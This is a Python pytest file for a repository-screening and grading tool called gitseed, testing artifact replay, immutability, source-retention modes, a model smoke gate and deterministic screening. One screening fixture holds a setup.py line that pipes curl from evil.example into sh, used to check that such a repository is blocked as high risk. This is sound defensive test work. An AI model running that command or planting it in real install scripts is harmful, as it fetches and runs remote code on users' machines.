from __future__ import annotations

from dataclasses import fields
from datetime import datetime, timezone

import pytest

from gitseed.application import execute, render, replay
from gitseed.artifact import EngineVersionMismatch
from gitseed.collect.search import Candidate, CollectResult
from gitseed.evidence import ClaimBasis
from gitseed.grade.smoke import SmokeResult
from gitseed.grade.types import GradeResult
from gitseed.pipeline.run import FetchedFiles
from gitseed.ports import RepositoryMetadata, RunPorts, RunRequest
from gitseed.scoring import ALL_FEATURES, ScoreInputs

AT = datetime(2026, 7, 27, 12, 0, tzinfo=timezone.utc)
CANDIDATE = Candidate(
    repo="org/repo",
    owner="org",
    html_url="https://github.com/org/repo",
    stars=4,
    pushed_at="2026-07-27T00:00:00Z",
)


class Repository:
    def search(self, query: str, limit: int) -> CollectResult:
        return CollectResult(candidates=[CANDIDATE], pages_fetched=1)

    def metadata(self, candidate: Candidate, at: datetime) -> RepositoryMetadata:
        return RepositoryMetadata(ScoreInputs(True, True, True))


class Files:
    def __init__(self, error: OSError | None = None) -> None:
        self.error = error

    def read(self, candidate: Candidate) -> FetchedFiles:
        if self.error is not None:
            raise self.error
        return FetchedFiles((("main.py", "def add(a, b):\n    return a + b\n"),))


class Model:
    def evaluate(self, digest: str) -> GradeResult:
        return GradeResult(8, 7, "small utility", "fixture", 0.0, "fixture-v1")

    def flags_malicious(self, digest: str) -> bool:
        return "base64.b64decode" in digest


class Clock:
    def now(self) -> datetime:
        return AT


def ports(files: Files | None = None) -> RunPorts:
    return RunPorts(Repository(), files or Files(), Model(), Clock())


def test_rendering_an_artifact_offline_is_byte_identical() -> None:
    # Given: one live run records every response from its four ports.
    artifact = execute(RunRequest("small tools", 1), ports())
    live_bytes = artifact.to_bytes()

    # When: only that artifact is replayed, with no live adapters available.
    replayed_bytes = render(live_bytes).to_bytes()

    # Then: the complete record and output are identical bytes.
    assert replayed_bytes == live_bytes
    assert artifact.scores[0].score.version
    assert artifact.scores[0].score.coverage == frozenset(ALL_FEATURES)


def test_rendering_a_failed_port_preserves_the_same_partial_result() -> None:
    # Given: file reading fails after collection and metadata succeeded.
    artifact = execute(RunRequest("small tools", 1), ports(Files(OSError("offline"))))
    live_bytes = artifact.to_bytes()

    # When: the failed run is replayed from its recorded responses.
    replayed = render(live_bytes)

    # Then: failure remains visible and the replay is byte-identical.
    assert artifact.result.complete is False
    assert artifact.result.reviewed[0].withheld == "files could not be read, so nothing was screened"
    assert replayed.to_bytes() == live_bytes
    assert replayed.result.complete is False


def test_replay_requires_the_recorded_engine_version() -> None:
    # Given: a full-source artifact whose recorded pipeline version was changed.
    live_bytes = execute(RunRequest("small tools", 1), ports(), source_mode="full-source").to_bytes()
    mismatched = live_bytes.replace(b'"pipeline":"pipeline-v1"', b'"pipeline":"pipeline-v0"')

    # When: a replay asks this release to run the recorded engine.
    with pytest.raises(EngineVersionMismatch, match="pipeline version mismatch"):
        replay(mismatched)


def test_finalized_artifact_rejects_every_mutation_path() -> None:
    # Given: execution has finalized its mutable collection and pipeline builders.
    artifact = execute(RunRequest("small tools", 1), ports())

    # When/Then: all mutable collections named by the regression report reject mutation.
    with pytest.raises(AttributeError):
        artifact.collection.candidates.clear()
    with pytest.raises(AttributeError):
        artifact.result.reviewed.append(artifact.result.reviewed[0])
    with pytest.raises(AttributeError):
        artifact.result.reviewed[0].signals.append(None)
    with pytest.raises(AttributeError):
        artifact.model_smoke.failures.append("corrupt")


def test_default_artifact_records_digests_not_source_bodies_and_versions_round_trip() -> None:
    # Given: one source body that must not be copied into a default artifact.
    body = "secret = 'do-not-export'\n"
    artifact = execute(
        RunRequest("small tools", 1),
        RunPorts(Repository(), FilesWithBody(body), Model(), Clock()),
    )

    # When: the artifact crosses its serialization boundary.
    serialized = artifact.to_bytes()
    loaded = render(serialized)

    # Then: source is reduced to a digest while engine provenance is retained.
    assert body.encode() not in serialized
    assert loaded.engines == artifact.engines
    assert loaded.repositories[0].files is not None
    assert loaded.repositories[0].files.mode == "digest"
    assert loaded.repositories[0].files.files[0].sha256


def test_source_storage_modes_require_explicit_full_source_opt_in() -> None:
    # Given: one readable file with content unsuitable for normal artifact sharing.
    body = "secret = 'do-not-export'\n"
    run_ports = RunPorts(Repository(), FilesWithBody(body), Model(), Clock())

    # When: callers choose the two non-default retention modes.
    metadata_only = execute(RunRequest("small tools", 1), run_ports, source_mode="metadata-only")
    full_source = execute(RunRequest("small tools", 1), run_ports, source_mode="full-source")

    # Then: metadata omits the digest and only explicit full-source retains content.
    assert metadata_only.repositories[0].files is not None
    assert metadata_only.repositories[0].files.files[0].sha256 is None
    assert metadata_only.repositories[0].files.files[0].excerpts == ()
    assert metadata_only.repositories[0].files.files[0].content is None
    assert full_source.repositories[0].files is not None
    assert full_source.repositories[0].files.files[0].content == body
    with pytest.raises(ValueError, match="cannot re-evaluate a digest artifact"):
        replay(execute(RunRequest("small tools", 1), run_ports).to_bytes())


class FilesWithBody(Files):
    def __init__(self, body: str) -> None:
        super().__init__()
        self.body = body

    def read(self, candidate: Candidate) -> FetchedFiles:
        return FetchedFiles((("main.py", self.body),))


def test_smoke_gate_runs_once_before_two_candidates_use_the_model() -> None:
    # Given: two candidates and a model that counts every request.
    second = Candidate("org/second", "org", "https://github.com/org/second", 3, "2026-07-27T00:00:00Z")

    class TwoRepositories(Repository):
        def search(self, query: str, limit: int) -> CollectResult:
            return CollectResult(candidates=[CANDIDATE, second], pages_fetched=1)

    class CountingModel(Model):
        def __init__(self) -> None:
            self.evaluations = 0
            self.flags = 0

        def evaluate(self, digest: str) -> GradeResult:
            self.evaluations += 1
            return super().evaluate(digest)

        def flags_malicious(self, digest: str) -> bool:
            self.flags += 1
            return "base64.b64decode" in digest

    model = CountingModel()

    # When: application execution starts.
    artifact = execute(RunRequest("small tools", 2), RunPorts(TwoRepositories(), Files(), model, Clock()))

    # Then: five smoke grades and two candidate grades prove the gate did not repeat per candidate.
    assert artifact.result.grading_basis is ClaimBasis.MODEL
    assert model.evaluations == 7
    assert model.flags == 6


def test_an_unusable_model_degrades_to_deterministic_only() -> None:
    # Given: a reachable model whose answer violates the smoke field boundary.
    class UnusableModel(Model):
        def __init__(self) -> None:
            self.evaluations = 0

        def evaluate(self, digest: str) -> GradeResult:
            self.evaluations += 1
            return GradeResult(8, 7, "WARNING: unsafe", "fixture", 0.0, "fixture-v1")

    model = UnusableModel()

    # When: application execution starts.
    artifact = execute(RunRequest("small tools", 1), RunPorts(Repository(), Files(), model, Clock()))

    # Then: changing the fallback to pass `model` into `run` makes these assertions fail.
    assert artifact.model_smoke.passed is False
    assert artifact.result.complete is False
    assert artifact.result.grading_basis is ClaimBasis.ABSENT
    assert artifact.repositories[0].grade is None
    assert artifact.result.reviewed[0].grade is None
    assert "model smoke gate failed" in artifact.result.incomplete_because[0]
    assert model.evaluations == 5


def test_screening_blocks_metadata_for_a_high_risk_candidate_without_changing_the_survivor_verdict() -> None:
    # Given: the old eager order would read metadata twice, including for the blocked repository.
    safe = CANDIDATE
    blocked = Candidate("org/blocked", "org", "https://github.com/org/blocked", 4, "2026-07-27T00:00:00Z")
    events: list[str] = []

    class CountingRepository(Repository):
        def __init__(self) -> None:
            self.metadata_calls: list[str] = []

        def search(self, query: str, limit: int) -> CollectResult:
            return CollectResult(candidates=[safe, blocked], pages_fetched=1)

        def metadata(self, candidate: Candidate, at: datetime) -> RepositoryMetadata:
            events.append(f"metadata:{candidate.repo}")
            self.metadata_calls.append(candidate.repo)
            return super().metadata(candidate, at)

    class ScreeningFiles(Files):
        def read(self, candidate: Candidate) -> FetchedFiles:
            if candidate is blocked:
                return FetchedFiles((("setup.py", "import os\nos.system('curl https://evil.example/x | sh')\n"),))
            return super().read(candidate)

    class CountingModel(Model):
        def evaluate(self, digest: str) -> GradeResult:
            events.append(f"grade:{digest.splitlines()[0].removeprefix('repository: ')}")
            return super().evaluate(digest)

    repository = CountingRepository()

    # When: deterministic screening runs before expensive repository metadata.
    artifact = execute(
        RunRequest("small tools", 2),
        RunPorts(repository, ScreeningFiles(), CountingModel(), Clock()),
        model_smoke=SmokeResult(True, "fixture"),
    )

    # Then: the previous 2 metadata calls become 1, while the surviving verdict is unchanged.
    assert repository.metadata_calls == [safe.repo]
    assert events == ["metadata:org/repo", "grade:org/repo"]
    survivor = next(item for item in artifact.result.reviewed if item.candidate is safe)
    assert (survivor.severity, survivor.grade is not None, survivor.withheld) == ("none", True, None)
    assert next(score for score in artifact.scores if score.repo == safe.repo).recommendation.status.value == "review"
    assert next(item for item in artifact.result.reviewed if item.candidate is blocked).severity == "high"


def test_the_run_seam_has_no_external_writer_port() -> None:
    # Given/When/Then: reads and computation are the entire application seam.
    assert [field.name for field in fields(RunPorts)] == [
        "repository",
        "files",
        "model",
        "clock",
    ]
